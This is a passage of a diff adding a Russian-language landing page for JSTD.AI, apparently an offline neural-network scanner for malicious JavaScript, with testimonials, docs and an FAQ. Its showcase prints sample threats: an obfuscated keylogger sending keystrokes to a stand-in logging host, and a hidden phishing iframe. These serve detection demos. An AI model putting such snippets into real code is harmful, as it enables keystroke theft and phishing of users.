+<span class="c-kw">var</span> _0x4a2b = [<span class="c-str">'keydown'</span>,
+  <span class="c-str">'addEventL'</span>+<span class="c-str">'istener'</span>,
+  <span class="c-str">'key'</span>, <span class="c-str">'POST'</span>,
+  <span class="c-str">'https://\x6c\x6f\x67'</span>+<span class="c-str">'\x67\x65r.io'</span>];
+<span class="c-kw">document</span>[_0x4a2b[1]](_0x4a2b[0],
+  <span class="c-kw">function</span>(e){ <span class="c-fn">xhr</span>[_0x4a2b[3]]
+  (e[_0x4a2b[2]]); });</code></pre>
+                    <div class="showcase-item__score"><span class="score-bar" style="--w:93%"></span><strong>93.5%</strong></div>
+                </div>
+                <div class="showcase-item">
+                    <div class="showcase-item__header">
+                        <div class="level-badge high">HIGH</div>
+                        <span data-i18n="show.i3">Скрытый iframe</span>
+                    </div>
+                    <pre class="showcase-code"><code><span class="c-comment">// Hidden phishing overlay</span>
+<span class="c-kw">var</span> f = <span class="c-kw">document</span>.<span class="c-fn">createElement</span>(
+  <span class="c-str">'iframe'</span>);
+f.style.display = <span class="c-str">'none'</span>;
+f.style.width = <span class="c-str">'100vw'</span>;
+f.style.height = <span class="c-str">'100vh'</span>;
+f.src = <span class="c-str">'https://phishing.site'</span>;
+<span class="c-kw">document</span>.body.<span class="c-fn">appendChild</span>(f);</code></pre>
+                    <div class="showcase-item__score"><span class="score-bar" style="--w:78%"></span><strong>78.4%</strong></div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ░░ TESTIMONIALS ░░ -->
+    <section class="section section--dark" id="testimonials">
+        <div class="container">
+            <div class="section__label" data-i18n="test.label">Отзывы</div>
+            <h2 class="section__title" data-i18n="test.h2">Доверяют профессионалы</h2>
+            <p class="section__desc" data-i18n="test.desc">Компании используют JSTD.AI как первую линию обороны перед передачей кода между отделами и подрядчиками.</p>
+
+            <div class="testimonials">
+                <div class="testimonials__track" id="testimonialsTrack">
+
+                    <div class="tcard">
+                        <div class="tcard__quote">
+                            <svg width="32" height="24" viewBox="0 0 32 24" fill="none">
+                                <path d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z" fill="#00d4ff" fill-opacity="0.2" />
+                            </svg>
+                        </div>
+                        <p class="tcard__text" data-i18n="test.t1_text">«Мы разрабатываем маркетплейс и регулярно получаем JS-виджеты от сторонних поставщиков. До JSTD.AI каждый файл приходилось читать вручную — или доверять. После одного инцидента с вшитым кейлоггером в виджете партнёра мы ввели обязательное
+                            сканирование. JSTD.AI за 2 секунды делает то, на что уходил час ревью.»</p>
+                        <div class="tcard__author">
+                            <div class="tcard__avatar" data-i18n="test.t1_av">АК</div>
+                            <div>
+                                <strong data-i18n="test.t1_nm">Андрей Климов</strong>
+                                <span data-i18n="test.t1_rl">CTO, RetailEdge Platform</span>
+                            </div>
+                            <div class="tcard__stars">★★★★★</div>
+                        </div>
+                        <div class="tcard__tag" data-i18n="test.t1_tg">E-commerce / SaaS</div>
+                    </div>
+
+                    <div class="tcard">
+                        <div class="tcard__quote">
+                            <svg width="32" height="24" viewBox="0 0 32 24" fill="none">
+                                <path d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z" fill="#a78bfa" fill-opacity="0.2" />
+                            </svg>
+                        </div>
+                        <p class="tcard__text" data-i18n="test.t2_text">«Наш отдел безопасности использует JSTD.AI для предварительного отсева исходников от фрилансеров перед тем, как они попадают на ревью архитекторам. За первый месяц система пометила 4 файла с реальными угрозами — один оказался полноценным
+                            бэкдором с WebSocket-каналом. Без инструмента мы бы пропустили.»</p>
+                        <div class="tcard__author">
+                            <div class="tcard__avatar" data-i18n="test.t2_av">МВ</div>
+                            <div>
+                                <strong data-i18n="test.t2_nm">Мария Воронова</strong>
+                                <span data-i18n="test.t2_rl">Head of Security, FinStream Bank</span>
+                            </div>
+                            <div class="tcard__stars">★★★★★</div>
+                        </div>
+                        <div class="tcard__tag" data-i18n="test.t2_tg">Финтех / Банкинг</div>
+                    </div>
+
+                    <div class="tcard">
+                        <div class="tcard__quote">
+                            <svg width="32" height="24" viewBox="0 0 32 24" fill="none">
+                                <path d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z" fill="#00ff88" fill-opacity="0.2" />
+                            </svg>
+                        </div>
+                        <p class="tcard__text" data-i18n="test.t3_text">«Мы аутсорсинговая студия — получаем готовый код от 12+ подрядчиков ежемесячно. JSTD.AI встроен в наш Slack-бот: разработчик закидывает файл, бот через 3 секунды отвечает уровнем угрозы. Два раза поймали prototype pollution в npm-скриптах,
+                            которые подрядчик "случайно" прокинул с продакшн-зависимостью.»</p>
+                        <div class="tcard__author">
+                            <div class="tcard__avatar" data-i18n="test.t3_av">ДС</div>
+                            <div>
+                                <strong data-i18n="test.t3_nm">Дмитрий Савельев</strong>
+                                <span data-i18n="test.t3_rl">Tech Lead, CodeBridge Agency</span>
+                            </div>
+                            <div class="tcard__stars">★★★★★</div>
+                        </div>
+                        <div class="tcard__tag" data-i18n="test.t3_tg">Аутсорс / Разработка</div>
+                    </div>
+
+                    <div class="tcard">
+                        <div class="tcard__quote">
+                            <svg width="32" height="24" viewBox="0 0 32 24" fill="none">
+                                <path d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z" fill="#ff6600" fill-opacity="0.2" />
+                            </svg>
+                        </div>
+                        <p class="tcard__text" data-i18n="test.t4_text">«Запускаем JSTD.AI как шаг в CI/CD перед деплоем на стейджинг-сервер. Интеграция заняла 20 минут. Теперь если в PR появляется что-то с eval() + Base64 — пайплайн падает автоматически и PR не мёрджится. Разработчики стали аккуратнее
+                            с зависимостями.»</p>
+                        <div class="tcard__author">
+                            <div class="tcard__avatar" data-i18n="test.t4_av">ЕП</div>
+                            <div>
+                                <strong data-i18n="test.t4_nm">Елена Петухова</strong>
+                                <span data-i18n="test.t4_rl">DevOps Engineer, LogiCore Systems</span>
+                            </div>
+                            <div class="tcard__stars">★★★★★</div>
+                        </div>
+                        <div class="tcard__tag" data-i18n="test.t4_tg">DevOps / CI-CD</div>
+                    </div>
+
+                    <div class="tcard">
+                        <div class="tcard__quote">
+                            <svg width="32" height="24" viewBox="0 0 32 24" fill="none">
+                                <path d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z" fill="#00d4ff" fill-opacity="0.15" />
+                            </svg>
+                        </div>
+                        <p class="tcard__text" data-i18n="test.t5_text">«Госконтракт требует сертификации поставляемого ПО. JSTD.AI генерирует HTML-отчёт с детализацией каждого найденного паттерна — это стало частью нашего пакета документов для заказчика. Больше не нужен отдельный пентест для базового
+                            аудита JS-компонентов.»</p>
+                        <div class="tcard__author">
+                            <div class="tcard__avatar" data-i18n="test.t5_av">ИР</div>
+                            <div>
+                                <strong data-i18n="test.t5_nm">Игорь Рязанцев</strong>
+                                <span data-i18n="test.t5_rl">Information Security Auditor, GovTech Solutions</span>
+                            </div>
+                            <div class="tcard__stars">★★★★★</div>
+                        </div>
+                        <div class="tcard__tag" data-i18n="test.t5_tg">Госсектор / Аудит ИБ</div>
+                    </div>
+
+                    <div class="tcard">
+                        <div class="tcard__quote">
+                            <svg width="32" height="24" viewBox="0 0 32 24" fill="none">
+                                <path d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z" fill="#a78bfa" fill-opacity="0.15" />
+                            </svg>
+                        </div>
+                        <p class="tcard__text" data-i18n="test.t6_text">«Перешли на JSTD.AI после того, как npm-аудит пропустил обфусцированный стилер в транзитивной зависимости. JSTD поймал его за секунду — eval внутри закодированной строки, которую стандартные линтеры считали валидным кодом. С тех
+                            пор это обязательный шаг перед каждым релизом.»</p>
+                        <div class="tcard__author">
+                            <div class="tcard__avatar" data-i18n="test.t6_av">НБ</div>
+                            <div>
+                                <strong data-i18n="test.t6_nm">Никита Белоусов</strong>
+                                <span data-i18n="test.t6_rl">Senior Frontend Engineer, CloudStack Labs</span>
+                            </div>
+                            <div class="tcard__stars">★★★★★</div>
+                        </div>
+                        <div class="tcard__tag" data-i18n="test.t6_tg">Облачные сервисы / Frontend</div>
+                    </div>
+
+                </div>
+
+                <div class="testimonials__controls">
+                    <button class="tctl tctl--prev" id="tPrev" aria-label="Предыдущий" data-i18n-label="test.prev">
+                        <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+                            <path d="M13 4L7 10L13 16" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" />
+                        </svg>
+                    </button>
+                    <div class="testimonials__dots" id="tDots"></div>
+                    <button class="tctl tctl--next" id="tNext" aria-label="Следующий" data-i18n-label="test.next">
+                        <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+                            <path d="M7 4L13 10L7 16" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" />
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ░░ DOCS ░░ -->
+    <section class="section" id="docs">
+        <div class="container">
+            <div class="section__label" data-i18n="docs.label">Документация</div>
+            <h2 class="section__title" data-i18n-html="docs.h2_html">Всё, что нужно знать<br />для работы</h2>
+            <p class="section__desc" data-i18n="docs.desc">JSTD.AI не требует настройки или технической экспертизы. Загрузите файл — получите результат. Ниже — полное описание интерфейса и интерпретация данных.</p>
+
+            <!-- QUICKSTART -->
+            <div class="docs-quickstart">
+                <div class="docs-qs-step">
+                    <div class="docs-qs-num">01</div>
+                    <div class="docs-qs-body">
+                        <strong data-i18n="docs.qs1_t">Загрузите JS-файлы</strong>
+                        <p data-i18n-html="docs.qs1_p">Нажмите кнопку <code>Load file(s)…</code> и выберите один или несколько
+                            <code>.js</code>-файлов. Поддерживается минифицированный, обфусцированный и многострочный код любого размера.
+                        </p>
+                    </div>
+                </div>
+                <div class="docs-qs-arrow">
+                    <svg width="32" height="16" viewBox="0 0 32 16" fill="none">
+                        <path d="M0 8H28M23 3L29 8L23 13" stroke="#00d4ff" stroke-width="1.3" stroke-linecap="square" />
+                    </svg>
+                </div>
+                <div class="docs-qs-step">
+                    <div class="docs-qs-num">02</div>
+                    <div class="docs-qs-body">
+                        <strong data-i18n="docs.qs2_t">Дождитесь анализа</strong>
+                        <p data-i18n-html="docs.qs2_p">Нейросетевой движок обрабатывает каждый файл за <code>&lt;&thinsp;1&thinsp;ms</code>. Результаты появляются мгновенно в панели <em>Analysis results</em>. Несколько файлов анализируются параллельно.</p>
+                    </div>
+                </div>
+                <div class="docs-qs-arrow">
+                    <svg width="32" height="16" viewBox="0 0 32 16" fill="none">
+                        <path d="M0 8H28M23 3L29 8L23 13" stroke="#00d4ff" stroke-width="1.3" stroke-linecap="square" />
+                    </svg>
+                </div>
+                <div class="docs-qs-step">
+                    <div class="docs-qs-num">03</div>
+                    <div class="docs-qs-body">
+                        <strong data-i18n="docs.qs3_t">Изучите отчёт</strong>
+                        <p data-i18n-html="docs.qs3_p">Кликните по строке в таблице — откроется детализация <em>Threat Details</em> с тремя вкладками. При необходимости экспортируйте полный HTML-отчёт кнопкой
+                            <code>Save as HTML report</code>.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- INTERFACE REFERENCE -->
+            <div class="docs-grid">
+
+                <!-- Panel: Source Viewer -->
+                <div class="docs-card">
+                    <div class="docs-card__icon">
+                        <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+                            <rect x="2" y="2" width="24" height="24" stroke="#00d4ff" stroke-width="1.3" />
+                            <path d="M7 8H21M7 13H21M7 18H15" stroke="#00d4ff" stroke-width="1.2" stroke-linecap="square" opacity=".7" />
+                            <circle cx="21" cy="18" r="4" fill="#050810" stroke="#a78bfa" stroke-width="1.2" />
+                            <path d="M19.5 18H22.5M21 16.5V19.5" stroke="#a78bfa" stroke-width="1" stroke-linecap="square" />
+                        </svg>
+                    </div>
+                    <div class="docs-card__label">Source code viewer</div>
+                    <h3 data-i18n="docs.c1_h3">Просмотрщик кода</h3>
+                    <p data-i18n="docs.c1_p">Отображает исходный код выбранного файла с синтаксической подсветкой. Комментарии, строки, ключевые слова и опасные конструкции выделяются цветом. Файл можно прокручивать — размер не ограничен.
+                    </p>
+                    <div class="docs-card__hint">
+                        <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+                            <circle cx="7" cy="7" r="6" stroke="#f59e0b" stroke-width="1" />
+                            <path d="M7 4V7.5M7 9.5V10" stroke="#f59e0b" stroke-width="1.2" stroke-linecap="square" />
+                        </svg> <span data-i18n="docs.c1_hint">Выберите файл в таблице справа — код обновится автоматически</span>
+                    </div>
+                </div>
+
+                <!-- Panel: Analysis Results -->
+                <div class="docs-card">
+                    <div class="docs-card__icon">
+                        <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+                            <rect x="2" y="2" width="24" height="24" stroke="#a78bfa" stroke-width="1.3" />
+                            <path d="M7 8H21" stroke="#a78bfa" stroke-width="1" opacity=".4" />
+                            <rect x="6" y="11" width="16" height="3" fill="rgba(255,51,102,.15)" stroke="#ff3366" stroke-width=".8" />
+                            <path d="M7 18H21M7 22H15" stroke="#a78bfa" stroke-width="1" stroke-linecap="square" opacity=".5" />
+                        </svg>
+                    </div>
+                    <div class="docs-card__label">Analysis results</div>
+                    <h3 data-i18n="docs.c2_h3">Таблица результатов</h3>
+                    <p data-i18n-html="docs.c2_p">Каждая строка — один файл. Столбцы: <strong>File Name</strong>, <strong>Threat Level</strong> (цветовая метка), <strong>Score</strong> (итоговый балл в процентах). Строки кликабельны — открывают детали в нижней панели.</p>
+                    <div class="docs-card__threat-mini">
+                        <div class="dtm-row"><span class="level-badge safe">SAFE</span><span>0 – 15%</span></div>
+                        <div class="dtm-row"><span class="level-badge low">LOW</span><span>15 – 35%</span></div>
+                        <div class="dtm-row"><span class="level-badge med">MEDIUM</span><span>35 – 65%</span></div>
+                        <div class="dtm-row"><span class="level-badge high">HIGH</span><span>65 – 85%</span></div>
+                        <div class="dtm-row"><span class="level-badge crit">CRITICAL</span><span>85 – 100%</span></div>
+                    </div>
+                </div>
+
+                <!-- Tab: Summary -->
+                <div class="docs-card">
+                    <div class="docs-card__icon">
+                        <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+                            <path d="M14 2L2 7V14C2 20.627 7.373 26 14 26C20.627 26 26 20.627 26 14V7L14 2Z" stroke="#ff3366" stroke-width="1.3" fill="none" />
+                            <path d="M9 14L12.5 17.5L19 11" stroke="#ff3366" stroke-width="1.4" stroke-linecap="square" />
+                        </svg>
+                    </div>
+                    <div class="docs-card__label" data-i18n="docs.c3_lbl">Вкладка — Threat Details</div>
+                    <h3>Summary</h3>
+                    <p data-i18n="docs.c3_p">Итоговый вердикт по файлу. Показывает уровень угрозы, три независимых скора и текстовое резюме. Отображает количество найденных нарушений и финальную рекомендацию.</p>
+                    <div class="docs-card__scores">
+                        <div class="dcs-row">
+                            <span>Overall Threat Score</span>
+                            <div class="dcs-bar">
+                                <div class="dcs-fill" style="--w:93%;--c:#ff3366"></div>
+                            </div>
+                            <strong class="dcs-val" style="color:#ff3366">93%</strong>
+                        </div>
+                        <div class="dcs-row">
+                            <span>Neural Network Score</span>
+                            <div class="dcs-bar">
+                                <div class="dcs-fill" style="--w:100%;--c:#ff6600"></div>
+                            </div>
+                            <strong class="dcs-val" style="color:#ff6600">100%</strong>
+                        </div>
+                        <div class="dcs-row">
+                            <span>Heuristic Analysis Score</span>
+                            <div class="dcs-bar">
+                                <div class="dcs-fill" style="--w:90%;--c:#f59e0b"></div>
+                            </div>
+                            <strong class="dcs-val" style="color:#f59e0b">90%</strong>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tab: Triggered Rules -->
+                <div class="docs-card">
+                    <div class="docs-card__icon">
+                        <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+                            <rect x="3" y="3" width="22" height="22" stroke="#00ff88" stroke-width="1.3" />
+                            <path d="M8 10H12M8 14H12M8 18H12" stroke="#ff3366" stroke-width="1.3" stroke-linecap="square" />
+                            <path d="M15 10H20M15 14H20M15 18H18" stroke="#00ff88" stroke-width="1" stroke-linecap="square" opacity=".5" />
+                        </svg>
+                    </div>
+                    <div class="docs-card__label" data-i18n="docs.c3_lbl">Вкладка — Threat Details</div>
+                    <h3>Triggered Rules</h3>
+                    <p data-i18n="docs.c4_p">Список сработавших эвристических правил. Каждое правило содержит название, severity в процентах и краткое описание атаки. Правила ранжированы по убыванию опасности.</p>
+                    <div class="docs-card__rules-demo">
+                        <div class="drd-row drd-row--crit">
+                            <span class="drd-dot"></span>
+                            <span class="drd-name">Cookie stealing pattern</span>
+                            <span class="drd-sev">93%</span>
+                        </div>
+                        <div class="drd-row drd-row--crit">
+                            <span class="drd-dot"></span>
+                            <span class="drd-name">Base64 with eval</span>
+                            <span class="drd-sev">92%</span>
+                        </div>
+                        <div class="drd-row drd-row--high">
+                            <span class="drd-dot"></span>
+                            <span class="drd-name">Prototype pollution attempt</span>
+                            <span class="drd-sev">91%</span>
+                        </div>
+                        <div class="drd-row drd-row--high">
+                            <span class="drd-dot"></span>
+                            <span class="drd-name">Function constructor with variables</span>
+                            <span class="drd-sev">90%</span>
+                        </div>
+                        <div class="drd-row drd-row--med">
+                            <span class="drd-dot"></span>
+                            <span class="drd-name">Remote script injection</span>
+                            <span class="drd-sev">88%</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tab: Detected Features -->
+                <div class="docs-card">
+                    <div class="docs-card__icon">
+                        <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+                            <circle cx="14" cy="14" r="11" stroke="#00d4ff" stroke-width="1.3" />
+                            <circle cx="14" cy="14" r="5" stroke="#00d4ff" stroke-width="1" opacity=".5" />
+                            <circle cx="14" cy="14" r="1.5" fill="#00d4ff" />
+                            <path d="M14 3V6M14 22V25M3 14H6M22 14H25" stroke="#00d4ff" stroke-width="1" opacity=".4" />
+                        </svg>
+                    </div>
+                    <div class="docs-card__label" data-i18n="docs.c3_lbl">Вкладка — Threat Details</div>
+                    <h3>Detected Features</h3>
+                    <p data-i18n="docs.c5_p">Сырые метрики, извлечённые из кода. Таблица из 50 признаков: Feature (название), Count (абсолютное количество), Description (что означает). Используется для ручного аудита и понимания решения нейросети.</p>
+                    <div class="docs-card__features-demo">
+                        <div class="dfd-header">
+                            <span>Feature</span>
+                            <span>Count</span>
+                            <span>Description</span>
+                        </div>
+                        <div class="dfd-row">
+                            <span>Code entropy</span>
+                            <strong>59</strong>
+                            <span>Randomness measure</span>
+                        </div>
+                        <div class="dfd-row">
+                            <span>Obfuscation level</span>
+                            <strong>7</strong>
+                            <span>Suspicious patterns</span>
+                        </div>
+                        <div class="dfd-row">
+                            <span>setInterval</span>
+                            <strong>2</strong>
+                            <span>Repeated execution</span>
+                        </div>
+                        <div class="dfd-row">
+                            <span>XMLHttpRequest</span>
+                            <strong>1</strong>
+                            <span>Network requests</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- System Monitor -->
+                <div class="docs-card">
+                    <div class="docs-card__icon">
+                        <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+                            <rect x="2" y="2" width="24" height="24" stroke="#a78bfa" stroke-width="1.3" />
+                            <path d="M5 18L9 12L13 15L17 8L23 18" stroke="#a78bfa" stroke-width="1.3" stroke-linecap="square" />
+                        </svg>
+                    </div>
+                    <div class="docs-card__label" data-i18n="docs.c6_lbl">Боковая панель</div>
+                    <h3>System Monitor</h3>
+                    <p data-i18n-html="docs.c6_p">Живой мониторинг состояния движка. Обновляется каждые 500&thinsp;мс. Все данные — локальные, никуда не отправляются.</p>
+                    <div class="docs-card__sysmon">
+                        <div class="dsm-group">
+                            <div class="dsm-title">[&gt;] Neural Network</div>
+                            <div class="dsm-row"><span>Init:</span><strong>0.14s</strong></div>
+                            <div class="dsm-row"><span>Memory:</span><strong>4.4 MB</strong></div>
+                            <div class="dsm-row"><span>Topology:</span><strong>50→30→1</strong></div>
+                            <div class="dsm-row"><span>Params:</span><strong>1 591</strong></div>
+                            <div class="dsm-row"><span>Accuracy:</span><strong class="dsm-accent">70.0%</strong></div>
+                        </div>
+                        <div class="dsm-group">
+                            <div class="dsm-title">[&gt;] Analysis</div>
+                            <div class="dsm-row"><span>Files:</span><strong>10</strong></div>
+                            <div class="dsm-row"><span>Threats:</span><strong class="dsm-warn">4</strong></div>
+                            <div class="dsm-row"><span>Avg Score:</span><strong>50.3%</strong></div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- FAQ ACCORDION -->
+            <div class="docs-faq">
+                <div class="docs-faq__title" data-i18n="docs.faq_title">Частые вопросы</div>
+                <div class="docs-faq__list" id="faqList">
+                    <div class="faq-item">
+                        <button class="faq-item__q" aria-expanded="false">
+                            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                                <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="1.4" stroke-linecap="square" />
+                            </svg>
+                            <span data-i18n="docs.faq1_q">Безопасно ли передавать мой код в программу?</span>
+                        </button>
+                        <div class="faq-item__a" data-i18n="docs.faq1_a">JSTD.AI работает полностью офлайн. Код не покидает ваш компьютер ни при каких условиях — никаких облачных API, телеметрии или обратных соединений. Весь анализ выполняется локально в памяти процесса.</div>
+                    </div>
+                    <div class="faq-item">
+                        <button class="faq-item__q" aria-expanded="false">
+                            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                                <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="1.4" stroke-linecap="square" />
+                            </svg>
+                            <span data-i18n-html="docs.faq2_q">Почему у безопасного кода с <code>fetch()</code> балл не нулевой?</span>
+                        </button>
+                        <div class="faq-item__a" data-i18n-html="docs.faq2_a">Нейросеть оценивает вероятность угрозы статистически. Наличие
+                            <code>fetch()</code>, <code>XMLHttpRequest</code> или <code>localStorage</code> само по себе не является угрозой — но поднимает базовый скор. Итоговая классификация учитывает комбинацию признаков: единичный <code>fetch()</code> без опасного контекста даёт уровень SAFE или LOW.
+                        </div>
+                    </div>
+                    <div class="faq-item">
+                        <button class="faq-item__q" aria-expanded="false">
+                            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                                <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="1.4" stroke-linecap="square" />
+                            </svg>
+                            <span data-i18n="docs.faq3_q">Что значит «Обфускация», если код написан вручную?</span>
+                        </button>
+                        <div class="faq-item__a" data-i18n="docs.faq3_a">Признак«Obfuscation level» — это не флаг пропуска через обфускатор, а метрика характеристик кода: длинные строки без пробелов, высокая энтропия, hex-литералы, минимум комментариев. Минифицированные бандлы (webpack, esbuild) будут
+                            иметь ненулевой уровень — это нормально и учитывается при расчёте итогового балла.</div>
+                    </div>
+                    <div class="faq-item">
+                        <button class="faq-item__q" aria-expanded="false">
+                            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                                <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="1.4" stroke-linecap="square" />
+                            </svg>
+                            <span data-i18n="docs.faq4_q">Что содержит HTML-отчёт?</span>
+                        </button>
+                        <div class="faq-item__a" data-i18n="docs.faq4_a">HTML-отчёт включает: шапку с датой и именем аналитика, итоговую таблицу по всем файлам, детализацию каждого файла (Summary + Triggered Rules + Detected Features), исходный код и временну́ю метку анализа. Файл самодостаточен — не
+                            требует интернета для просмотра.</div>
+                    </div>
+                    <div class="faq-item">
+                        <button class="faq-item__q" aria-expanded="false">
+                            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                                <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="1.4" stroke-linecap="square" />
+                            </svg>
+                            <span data-i18n="docs.faq5_q">Можно ли анализировать минифицированные файлы?</span>
+                        </button>
+                        <div class="faq-item__a" data-i18n="docs.faq5_a">Да. Нейросеть обучена на примерах минифицированного кода. Признаки извлекаются независимо от форматирования. Минификация сама по себе поднимает признак обфускации, но не влияет на итоговую классификацию — при отсутствии опасных
+                            паттернов файл получит SAFE или LOW.</div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- ░░ CTA ░░ -->
+    <section class="section cta-section" id="cta">
+        <div class="cta-section__bg"></div>
+        <div class="container">
+            <div class="cta-inner">
+                <div class="section__label" data-i18n="cta.label">Защита начинается здесь</div>
+                <h2 class="cta-inner__title" data-i18n-html="cta.title_html">
+                    Каждый JS-файл —<br /> это потенциальная<br />
+                    <span class="cracked-word cracked-word--lg" data-text="дыра">дыра</span>
+                </h2>
+                <p data-i18n="cta.p">JSTD.AI работает полностью локально на Windows. Не нужен интернет. Не нужен GPU. Установка займёт минуту — первый анализ будет через три...</p>
+                <div class="cta-inner__actions">
+                    <a href="./download" class="btn btn--primary btn--lg">
+                        <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+                            <path d="M9 2V12M9 12L5 8M9 12L13 8" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" />
+                            <path d="M3 15H15" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" />
+                        </svg> <span data-i18n="cta.btn_primary">Скачать JSTD.AI</span>
+                    </a>
+                    <a href="#docs" class="btn btn--ghost btn--lg">
+                        <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+                            <path d="M3 3H15V15H3V3Z" stroke="currentColor" stroke-width="1.5" />
+                            <path d="M7 7H11M7 10H11" stroke="currentColor" stroke-width="1.3" stroke-linecap="square" />
+                        </svg> <span data-i18n="cta.btn_ghost">Документация</span>
+                    </a>
+                </div>
+                <div class="cta-inner__specs">
+                    <div class="spec">
+                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                            <path d="M8 1L1 4.5V9C1 12.314 4.134 15 8 15C11.866 15 15 12.314 15 9V4.5L8 1Z" stroke="#00ff88" stroke-width="1.2" />
+                        </svg> Windows 7+
+                    </div>
+                    <div class="spec">
+                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                            <circle cx="8" cy="8" r="6" stroke="#00d4ff" stroke-width="1.2" />
+                            <path d="M5 8L7.5 10.5L11 6" stroke="#00d4ff" stroke-width="1.2" stroke-linecap="square" />
+                        </svg> .NET Framework 4.7.2
+                    </div>
+                    <div class="spec">
+                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                            <rect x="2" y="2" width="12" height="12" stroke="#a78bfa" stroke-width="1.2" />
+                            <path d="M5 8H11M8 5V11" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="square" />
+                        </svg> <span data-i18n="cta.spec3">&lt;1 МБ исполняемый файл</span>
+                    </div>
+                    <div class="spec">
+                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                            <path d="M3 8L6 11L13 5" stroke="#00ff88" stroke-width="1.5" stroke-linecap="square" />
+                        </svg> <span data-i18n="cta.spec4">Без интернета</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ░░ FOOTER ░░ -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer__inner">
+                <div class="footer__brand">
+                    <a href="#" class="nav__logo">
+                        <svg width="28" height="28" viewBox="0 0 32 32" fill="none">
+                            <path d="M16 2L4 7.5V16C4 22.627 9.373 28 16 28C22.627 28 28 22.627 28 16V7.5L16 2Z" stroke="#00d4ff" stroke-width="1.5" fill="none" />
+                            <path d="M16 7L9 10.25V16C9 19.866 12.134 23 16 23C19.866 23 23 19.866 23 16V10.25L16 7Z" fill="#00d4ff" fill-opacity="0.12" stroke="#00d4ff" stroke-width="1" />
+                            <path d="M13 16L15.5 18.5L20 13" stroke="#00d4ff" stroke-width="1.5" stroke-linecap="square" />
+                        </svg>
+                        <span class="nav__logo-text">JSTD<span class="brand-accent">.AI</span></span>
+                    </a>
+                    <p data-i18n-html="footer.brand_p">Проприетарная нейросетевая система<br />детекции угроз в JavaScript-коде.</p>
